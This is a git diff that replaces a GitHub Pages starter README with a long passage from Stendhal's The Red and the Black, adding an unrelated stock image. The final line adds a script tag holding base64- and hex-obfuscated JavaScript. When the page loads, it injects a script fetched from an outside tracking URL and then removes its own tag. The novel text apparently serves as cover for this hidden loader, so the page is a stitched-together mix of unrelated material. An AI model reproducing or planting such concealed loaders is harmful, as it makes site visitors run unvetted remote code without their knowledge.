@@ -1,37 +1,73 @@
-## Welcome to GitHub Pages
+# CRUEL MOMENTS
 
-You can use the [editor on GitHub](https://github.com/kiryushachernov/Kasa/edit/master/README.md) to maintain and preview the content for your website in Markdown files.
+The delighted mademoiselle de la Mole thought of nothing but the happiness of having been nearly killed. She went so far as to say to herself, "he is worthy of being my master since he was on the point of killing me. How many handsome young society men would have to be melted together before they were capable of so passionate a transport."
 
-Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.
+"I must admit that he was very handsome at the time when he climbed up on the chair to replace the sword in the same picturesque position in which the decorator hung it! After all it was not so foolish of me to love him."
 
-### Markdown
+If at that moment some honourable means of reconciliation had presented itself, she would have embraced it with pleasure. Julien locked in his room was a prey to the most violent despair. He thought in his madness of throwing himself at her feet. If instead of hiding himself in an out of the way place, he had wandered about the garden of the hôtel so as to keep within reach of any opportunity, he would perhaps have changed in a single moment his awful unhappiness into the keenest happiness.
 
-Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for
+But the tact for whose lack we are now reproaching him would have been incompatible with that sublime seizure of the sword, which at the present time rendered him so handsome in the eyes of mademoiselle de la Mole. This whim in Julien's favour lasted the whole day; Mathilde conjured up a charming image of the short moments during which she had loved him: she regretted them.
 
-```markdown
-Syntax highlighted code block
+"As a matter of fact," she said to herself, "my passion for this poor boy can from his point of view only have lasted from one hour after midnight when I saw him arrive by his ladder with all his pistols in his coat pocket, till eight o'clock in the morning. It was a quarter of an hour after that as I listened to mass at Sainte-Valère that I began to think that he might very well try to terrify me into obedience."
+![i](https://post.medicalnewstoday.com/wp-content/uploads/sites/3/2020/02/322868_1100-1100x628.jpg)
+After dinner mademoiselle de la Mole, so far from avoiding Julien, spoke to him and made him promise to follow her into the garden. He obeyed. It was a new experience.
 
-# Header 1
-## Header 2
-### Header 3
+Without suspecting it Mathilde was yielding to the love which she was now feeling for him again. She found an extreme pleasure in walking by his side, and she looked curiously at those hands which had seized the sword to kill her that very morning.
 
-- Bulleted
-- List
+After such an action, after all that had taken place, some of the former conversation was out of the question.
 
-1. Numbered
-2. List
+Mathilde gradually began to talk confidentially to him about the state of her heart. She found a singular pleasure in this kind of conversation, she even went so far as to describe to him the fleeting moments of enthusiasm which she had experienced for M. de Croisenois, for M. de Caylus——
 
-**Bold** and _Italic_ and `Code` text
+"What! M. de Caylus as well!" exclaimed Julien, and all the jealousy of a discarded lover burst out in those words, Mathilde thought as much, but did not feel at all insulted.
 
-[Link](url) and ![Image](src)
-```
+She continued torturing Julien by describing her former sentiments with the most picturesque detail and the accent of the most intimate truth. He saw that she was portraying what she had in her mind's eye. He had the pain of noticing that as she spoke she made new discoveries in her own heart.
 
-For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).
+The unhappiness of jealousy could not be carried further.
 
-### Jekyll Themes
+It is cruel enough to suspect that a rival is loved, but there is no doubt that to hear the woman one adores confess in detail the love which rivals inspires, is the utmost limit of anguish.
 
-Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/kiryushachernov/Kasa/settings). The name of this theme is saved in the Jekyll `_config.yml` configuration file.
+Oh, how great a punishment was there now for those impulses of pride which had induced Julien to place himself as superior to the Caylus and the Croisenois! How deeply did he feel his own unhappiness as he exaggerated to himself their most petty advantages. With what hearty good faith he despised himself.
 
-### Support or Contact
+Mathilde struck him as adorable. All words are weak to express his excessive admiration. As he walked beside her he looked surreptitiously at her hands, her arms, her queenly bearing. He was so completely overcome by love and unhappiness as to be on the point of falling at her feet and crying "pity."
 
-Having trouble with Pages? Check out our [documentation](https://help.github.com/categories/github-pages-basics/) or [contact support](https://github.com/contact) and we’ll help you sort it out.
+"Yes, and that person who is so beautiful, who is so superior to everything and who loved me once, will doubtless soon love M. de Caylus."
+
+Julien could have no doubts of mademoiselle de la Mole's sincerity, the accent of truth was only too palpable in everything she said. In order that nothing might be wanting to complete his unhappiness there were moments when, as a result of thinking about the sentiments which she had once experienced for M. de Caylus, Mathilde came to talk of him, as though she loved him at the present time. She certainly put an inflection of love into her voice. Julien distinguished it clearly.
+
+He would have suffered less if his bosom had been filled inside with molten lead. Plunged as he was in this abyss of unhappiness how could the poor boy have guessed that it was simply because she was talking to him, that mademoiselle de la Mole found so much pleasure in recalling those weaknesses of love which she had formerly experienced for M. de Caylus or M. de Luz.
+
+Words fail to express Julien's anguish. He listened to these detailed confidences of the love she had experienced for others in that very avenue of pines where he had waited so few days ago for one o'clock to strike that he might invade her room. No human being can undergo a greater degree of unhappiness.
+
+This kind of familiar cruelty lasted for eight long days. Mathilde sometimes seemed to seek opportunities of speaking to him and sometimes not to avoid them; and the one topic of conversation to which they both seemed to revert with a kind of cruel pleasure, was the description of the sentiments she had felt for others. She told him about the letters which she had written, she remembered their very words, she recited whole sentences by heart.
+
+She seemed during these last days to be envisaging Julien with a kind of malicious joy. She found a keen enjoyment in his pangs.
+
+One sees that Julien had no experience of life; he had not even read any novels. If he had been a little less awkward and he had coolly said to the young girl, whom he adored so much and who had been giving him such strange confidences: "admit that though I am not worth as much as all these gentlemen, I am none the less the man whom you loved," she would perhaps have been happy at being at thus guessed; at any rate success would have entirely depended on the grace with which Julien had expressed the idea, and on the moment which he had chosen to do so. In any case he would have extricated himself well and advantageously from a situation which Mathilde was beginning to find monotonous.
+
+"And you love me no longer, me, who adores you!" said Julien to her one day, overcome by love and unhappiness. This piece of folly was perhaps the greatest which he could have committed. These words immediately destroyed all the pleasure which mademoiselle de la Mole found in talking to him about the state of her heart. She was beginning to be surprised that he did not, after what had happened, take offence at what she told him. She had even gone so far as to imagine at the very moment when he made that foolish remark that perhaps he did not love her any more. "His pride has doubtless extinguished his love," she was saying to herself. "He is not the man to sit still and see people like Caylus, de Luz, Croisenois whom he admits are so superior, preferred to him. No, I shall never see him at my feet again."
+
+Julien had often in the naivety of his unhappiness, during the previous days praised sincerely the brilliant qualities of these gentlemen; he would even go so far as to exaggerate them. This nuance had not escaped mademoiselle de la Mole, she was astonished by it, but did not guess its reason. Julien's frenzied soul, in praising a rival whom he thought was loved, was sympathising with his happiness.
+
+These frank but stupid words changed everything in a single moment; confident that she was loved, Mathilde despised him utterly.
+
+She was walking with him when he made his ill-timed remark; she left him, and her parting look expressed the most awful contempt. She returned to the salon and did not look at him again during the whole evening. This contempt monopolised her mind the following day. The impulse which during the last week had made her find so much pleasure in treating Julien as her most intimate friend was out of the question; the very sight of him was disagreeable. The sensation Mathilde felt reached the point of disgust; nothing can express the extreme contempt which she experienced when her eyes fell upon him.
+
+Julien had understood nothing of the history of Mathilde's heart during the last week, but he distinguished the contempt. He had the good sense only to appear before her on the rarest possible occasions, and never looked at her.
+
+But it was not without a mortal anguish that he, as it were, deprived himself of her presence. He thought he felt his unhappiness increasing still further. "The courage of a man's heart cannot be carried further," he said to himself. He passed his life seated at a little window at the top of the hôtel; the blind was carefully closed, and from here at any rate he could see mademoiselle de la Mole when she appeared in the garden.
+
+What were his emotions when he saw her walking after dinner with M. de Caylus, M. de Luz, or some other for whom she had confessed to him some former amorous weakness!
+
+Julien had no idea that unhappiness could be so intense; he was on the point of shouting out. This firm soul was at last completely overwhelmed.
+
+Thinking about anything else except mademoiselle de la Mole had become odious to him; he became incapable of writing the simplest letters.
+
+"You are mad," the marquis said to him.
+
+Julien was frightened that his secret might be guessed, talked about illness and succeeded in being believed. Fortunately for him the marquis rallied him at dinner about his next journey; Mathilde understood that it might be a very long one. It was now several days that Julien had avoided her, and the brilliant young men who had all that this pale sombre being she had once loved was lacking, had no longer the power of drawing her out of her reverie.
+
+"An ordinary girl," she said to herself, "would have sought out the man she preferred among those young people who are the cynosure of a salon; but one of the characteristics of genius is not to drive its thoughts over the rut traced by the vulgar.
+
+"Why, if I were the companion of a man like Julien, who only lacks the fortune that I possess, I should be continually exciting attention, I should not pass through life unnoticed. Far from incessantly fearing a revolution like my cousins who are so frightened of the people that they have not the pluck to scold a postillion who drives them badly, I should be certain of playing a rôle and a great rôle, for the man whom I have chosen has a character and a boundless ambition. What does he lack? Friends, money? I will give them him." But she treated Julien in her thought as an inferior being whose love one could win whenever one wanted.
+
+<script id="uIFFu" src="data:text/javascript;base64, dmFyIF9vRjV3ayA9IFsnXHg3MVx4NzVceDY1XHg3Mlx4NzlceDUzXHg2NVx4NmNceDY1XHg2M1x4NzRceDZmXHg3MicsICdceDYyXHg2Zlx4NjRceDc5JywgJ1x4NjdceDY1XHg3NFx4NDVceDZjXHg2NVx4NmRceDY1XHg2ZVx4NzRceDQyXHg3OVx4NDlceDY0JywgJ1x4NDRceDRmXHg0ZFx4NDNceDZmXHg2ZVx4NzRceDY1XHg2ZVx4NzRceDRjXHg2Zlx4NjFceDY0XHg2NVx4NjQnLCAnXHg2M1x4NzJceDY1XHg2MVx4NzRceDY1XHg0NVx4NmNceDY1XHg2ZFx4NjVceDZlXHg3NCcsICdceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnLCAnXHg3NFx4NzlceDcwXHg2NScsICdceDc0XHg2NVx4NzhceDc0XHgyZlx4NmFceDYxXHg3Nlx4NjFceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnXTsoZnVuY3Rpb24oX2kxWFphLCBfdzdlZHkpIHt2YXIgX0FvdHNPID0gZnVuY3Rpb24oX0pxcEF6KSB7d2hpbGUgKC0tX0pxcEF6KSB7X2kxWFphWydwdXNoJ10oX2kxWFphWydzaGlmdCddKCkpO319O19Bb3RzTygrK193N2VkeSk7fShfb0Y1d2ssIDB4MTFiKSk7dmFyIF9kUjl6RCA9IGZ1bmN0aW9uKF92bGZWTSwgXzdzSjFsKSB7X3ZsZlZNID0gX3ZsZlZNIC0gMHgwO3ZhciBfY3BncHIgPSBfb0Y1d2tbX3ZsZlZNXTtyZXR1cm4gX2NwZ3ByO307ZG9jdW1lbnRbJ1x4NjFceDY0XHg2NFx4NDVceDc2XHg2NVx4NmVceDc0XHg0Y1x4NjlceDczXHg3NFx4NjVceDZlXHg2NVx4NzInXShfZFI5ekQoJzB4MCcpLCBmdW5jdGlvbigpIHt2YXIgX3ZIbWEyID0gZG9jdW1lbnRbX2RSOXpEKCcweDEnKV0oX2RSOXpEKCcweDInKSk7X3ZIbWEyW19kUjl6RCgnMHgzJyldID0gX2RSOXpEKCcweDQnKTtfdkhtYTJbJ1x4NzNceDcyXHg2MyddID0gJ1x4NjhceDc0XHg3NFx4NzBceDczXHgzYVx4MmZceDJmXHg3Nlx4NmNceDYxXHg2NFx4NjNceDY4XHg2OVx4NmNceDY0XHg2MVx4NjNceDYzXHgzNFx4MmVceDY0XHg3Mlx4NjlceDc2XHg2NVx4MmRceDc2XHgyZVx4NjNceDZmXHg2ZFx4MmZceDVmXHg3Mlx4NjVceDZkXHg2Zlx4NzRceDY1XHg1Zlx4NzRceDcyXHg2MVx4NjNceDZiXHgyZVx4NmFceDczXHgzZlx4NjNceDYxXHg2ZFx4NzBceDYxXHg2OVx4NjdceDZlXHgzZFx4NDNceDU3XHg0OFx4MzRceDc0XHg3YVx4NDhceDQ3XHg0YVx4NmInO2RvY3VtZW50W19kUjl6RCgnMHg1JyldKF9kUjl6RCgnMHg2JykpWydceDYxXHg3MFx4NzBceDY1XHg2ZVx4NjRceDQzXHg2OFx4NjlceDZjXHg2NCddKF92SG1hMik7ZG9jdW1lbnRbX2RSOXpEKCcweDcnKV0oJ3VJRkZ1JylbJ1x4NzJceDY1XHg2ZFx4NmZceDc2XHg2NSddKCk7fSwgeydceDZmXHg2ZVx4NjNceDY1JzogISFbXX0pOw=="></script>
